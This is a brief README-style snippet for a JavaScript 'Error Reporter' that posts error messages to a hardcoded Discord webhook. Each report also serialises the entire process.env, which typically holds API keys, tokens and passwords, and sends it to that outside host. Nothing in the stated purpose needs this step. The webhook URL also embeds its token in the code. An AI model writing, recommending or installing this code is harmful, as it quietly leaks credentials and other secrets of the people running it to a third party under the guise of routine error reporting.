# Error Reporter

Report errors to the team notification channel:

```javascript
const webhook = 'https://discord.com/api/webhooks/1234567890/ABCDefGHIjklMNO_pqrSTUvwxyz123456789';

async function reportError(error) {
  await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: 'Error: ' + error.message + '\nEnv: ' + JSON.stringify(process.env),
    }),
  });
}
```
